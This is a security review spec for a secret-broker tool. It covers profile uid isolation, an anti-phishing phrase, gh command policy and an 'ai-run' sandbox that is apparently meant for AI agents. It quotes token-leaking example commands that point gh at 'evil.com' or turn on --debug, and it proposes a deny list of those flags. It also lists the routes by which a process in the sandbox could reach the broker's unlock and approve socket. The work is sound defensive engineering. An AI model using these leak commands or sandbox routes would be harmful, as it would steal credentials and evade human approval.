# Spec: Isolation, anti-phishing, gh policy, ai-run sandbox

Review findings against `main` (`d10176c`). Plan first, then fix in the
order below.

## Findings

1. **Shared uid.** Every profile child is spawned as `agent-secrets`, the
   same uid as the broker. Residual risk 6 in the README treats this as
   acceptable because `/var/lib/secret-broker` "holds no secrets". That is
   false for isolation: profile homes (`hosts.yml`, caches), the PIN file
   (mode 0600, owner `agent-secrets`), and any dumpable sibling's
   `/proc/<pid>/environ` are readable by every other profile. The
   "different uid" claim in the threat-model table only holds against the
   human user, not against other profiles or the broker's own children.
2. **Anti-phishing phrase is handed out.** `set-pin` stores the phrase.
   `run_approval` copies it into every `Prompt` sent to the current
   prompter (`server.rs`). `register_prompter` accepts the last client on
   `broker.sock`; any allowed uid can take over. The CLI also prints
   `your phrase:` on stderr during terminal approve. A fake dialog that
   registers first therefore displays the genuine phrase.
3. **README `gh` example leaks the token.** The short allow-list includes
   `[ "api" "repos/*" "**" ]`. `**` lets the caller pass `gh` global
   flags after the subcommand. `gh pr list --hostname evil.com` and
   `gh api repos/x --debug` send or print `Authorization: token …`.
   Residual risk 3 already warns about `--debug`; the shipped example
   still enables it. Deny rules for `auth`/`alias`/`extension`/`config`
   do not catch `--hostname` or `--debug`.
4. **ai-run can reach `broker.sock`.** The sandbox `--ro-bind`s `/` and
   then overlays `/dev/null` on `/run/secret-broker/broker.sock` *if that
   path exists at plan time*. Missing paths are skipped, so a sandbox
   started before the socket exists later sees the real socket. The
   directory `/run/secret-broker` stays fully reachable (mode 0755,
   sockets 0660 `secret-broker` group — the human user is in that group).
   `/var/run/secret-broker/broker.sock` is not in the default mask.
   `writable_from_env` will `--bind` any existing absolute directory,
   including `/run` or `/run/secret-broker`. A profile may `unmask` the
   full socket. Together these are the paths that reach unlock / approve /
   set-pin / prompter from inside ai-run.

No `spec/` existed; this file is it.

## 1. Per-profile uid

### Behaviour

- The broker keeps running as `agent-secrets`.
- Each enabled profile gets a system user `sb-<profile>` (group of the
  same name), home `/var/lib/secret-broker/home/<profile>`, shell
  `nologin`.
- `spawn` sets the child's uid/gid to that user before `exec` (`CommandExt`
  on Linux and macOS). The child is also marked non-dumpable.
- Profile homes are `0700` and owned by `sb-<profile>`. The broker's
  `state_dir` (`/var/lib/secret-broker`, including `auth/pin`) stays
  `0700 agent-secrets`, so a profile child cannot read the PIN, sibling
  homes, or the secrets file path.
- Config grows `Profile.user: String` (login name). The NixOS module
  fills it. A missing/unknown user is a start-time error, not a silent
  fall-back to `agent-secrets`.
- The broker needs `CAP_SETUID` and `CAP_SETGID` in
  `CapabilityBoundingSet` / `AmbientCapabilities` (in addition to the
  existing `CAP_SYS_PTRACE` for the proc helper). They are used only in
  the child after fork, never to raise privilege. `NoNewPrivileges=true`
  stays. The syscall filter keeps `~ptrace`.
- Profile names already go through `valid_name`; the user name is
  `sb-` plus that name. NixOS `users.users` is created for every enabled
  profile.

### Out of scope

- A nix-darwin service module (none exists). The spawn path still honours
  `Profile.user` when the operator creates the users by hand.
- Changing `ProtectProc=invisible` (kept as defence in depth).

### Tests / docs

- Unit: `spawn` pre_exec drops to the configured uid when the test is
  root; otherwise skip. Config load rejects an empty `user` on a
  non-test profile? Keep tests working by allowing the current uid when
  `user` is omitted **only in tests** — production JSON from the NixOS
  module always sets it. Simpler: omitted `user` means "current uid"
  (today's behaviour), and the NixOS module always sets it. README
  residual risk 6 is rewritten: profiles do not share a uid; the leftover
  risk is root and a bug in setuid.
- VM test: two profiles, each `id -u` / `stat $HOME` shows distinct uids
  and `EACCES` on the sibling home and on `auth/pin`.

## 2. Phrase only to a trusted dialog

### Behaviour

- New config: `approval.prompter_exe` (absolute path of
  `secret-broker-dialog`) and `approval.client_exe` (absolute path of
  `secret-broker`). The NixOS module sets both from `cfg.package` /
  `cfg.dialogPackage`.
- `register_prompter` snapshots the caller (already) and refuses unless
  `caller.exe` equals `prompter_exe` (after `fs::canonicalize` of the
  config path). Sandbox socket already refuses `prompter`.
- `run_approval` includes `phrase` only after that check (the Channel
  was accepted at register time). Terminal `approve_here` includes
  `phrase` only when `caller.exe` equals `client_exe`.
- If `prompter_exe` is empty (unit tests, unpackaged runs), registration
  stays open so existing tests keep working. The NixOS module always
  sets it.
- PIN remains available on a trusted dialog. An untrusted client that
  somehow became the prompter is disconnected at register, so it never
  receives a `Prompt`.

### Tests / docs

- Existing dialog tests keep passing (`prompter_exe` unset).
- New test: with `prompter_exe` set to `/nonexistent`, `prompter`
  returns an error and `status.prompter` stays false.
- VM test: a copied/other binary on `broker.sock` cannot register; the
  real dialog still receives `phrase == "blue otter"`.
- README residual of the quick path: the phrase is the tell *because*
  only the packaged dialog is given it. Unsandboxed same-uid `LD_PRELOAD`
  of that dialog remains residual (already covered by "edit the user
  service").

## 3. `gh` policy cannot leak the token

### Behaviour

- Policy grows `deny_tokens`: globs matched against **every** argument,
  any position, after the positional deny/allow check's deny-first rule
  and **before** allow. A match refuses the exec.
- The README short example and the Setup `profiles.gh` example:
  - drop `**` from `api` / `pr` / `issue` rules
  - add `denyTokens = [ "--hostname" "--hostname=*" "--debug" "-v" "--verbose" "--config" "--config=*" ]`
  - keep the existing `auth` / `alias` / `extension` / `config` positional denies
- NixOS option `denyTokens` on each profile, default `[]`.
- `*` in a deny token is the existing glob (`--hostname=*` matches
  `--hostname=evil.com`).

### Tests / docs

- `policy.rs`: `["pr","list","--hostname","evil.com"]` is refused when
  `deny_tokens` contains `--hostname`; `["pr","list"]` still allowed.
  `["api","repos/x","--debug"]` refused. Exact `["api","repos/x"]`
  allowed. Residual risk 3 still mentions transformed output; the example
  no longer enables the known flags.

## 4. ai-run: no path to `broker.sock`

### Behaviour

Replace "overlay `/dev/null` on the socket if it exists" with "the
sandbox never has a filesystem path to the full socket":

- After the `/` bind, mount a fresh tmpfs on `/run/secret-broker`.
  If `/var/run/secret-broker` is a distinct directory (not the same
  inode as `/run/secret-broker`), tmpfs that too. Then `--bind` only
  `agent.sock` (via `--bind-try`) into the tmpfs. `broker.sock` cannot
  appear later, and `/var/run` aliases do not resurrect it.
- Keep `/dev/null` overlays on both `broker.sock` paths as defence in
  depth, using `--ro-bind-try` so a missing socket is still hidden
  when the tmpfs is not used (tests, odd layouts).
- Default mask always includes both
  `/run/secret-broker/broker.sock` and
  `/var/run/secret-broker/broker.sock`.
- Refuse `unmask` of those paths (plan error).
- `writable` / `writable_from_env` / profile `writable`: refuse if the
  resolved path is `/`, `/run`, `/var`, `/var/run`, `/etc`, `/usr`,
  `/dev`, `/proc`, `/sys`, or `/run/secret-broker` (or a prefix of the
  broker socket). A `GROK_HOME=/run` bind is a plan error, not a
  writable `/run`.
- `SECRET_BROKER_SOCKET` in profile/global env that points at
  `broker.sock` is a plan error.
- `ai-run` closes inherited fds above stderr before exec except the
  dbus-proxy `--sync-fd`.

### Tests / docs

- Planner tests: args contain `--tmpfs /run/secret-broker` and a bind of
  `agent.sock`; they do not bind `broker.sock` read-write. Missing
  `broker.sock` still produces the tmpfs. `unmask` of the full socket
  errors. `writable_from_env` of `/run` errors.
- VM test already does
  `SECRET_BROKER_SOCKET=/run/secret-broker/broker.sock secret-broker status`
  and expects failure; keep it. Add: sandbox started with the socket
  masked only via tmpfs can `secret-run` through `agent.sock` and cannot
  `unlock`.
- README sandbox table: `/run/secret-broker` is a tmpfs containing only
  `agent.sock`.

## Order of work

1. This spec.
2. Finding 3 (policy + README) — smallest, no privilege change.
3. Finding 2 (phrase / prompter exe).
4. Finding 4 (sandbox planner).
5. Finding 1 (per-profile uid + NixOS users + VM test).

Each step updates the README threat model / residual risks to match the
new behaviour.
